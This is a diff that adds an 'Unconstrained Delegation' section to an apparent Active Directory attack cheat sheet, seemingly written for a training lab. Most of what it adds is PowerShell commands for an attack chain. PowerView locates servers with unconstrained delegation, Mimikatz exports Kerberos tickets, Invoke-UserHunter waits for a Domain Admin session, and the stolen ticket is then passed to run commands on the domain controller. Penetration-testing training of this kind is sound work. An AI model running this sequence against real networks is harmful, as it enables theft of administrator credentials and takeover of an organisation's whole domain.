@@ -206,6 +206,27 @@ Set-DomainObject -Identity sqlreportuser -SET @{serviceprincipalname='sqlreportu
 Set-DomainObject -Identify sqlreportuser -Clear serviceprincipalname
 ```
 
+### Unconstrained Delegation
+Servers with uncontrained delegations
+```powershell
+Get-NetComputer -Unconstrained | select -ExpandProperty name
+```
+Dump tickets
+```powershell
+cd .\userX
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+Use PowerView to wait Domain Admin to access resource on specific host
+```powershell
+Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
+(dump tickets)
+```
+Reuse ticket
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;6f5638a]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
+```
+
 
 #### Mimikatz
 
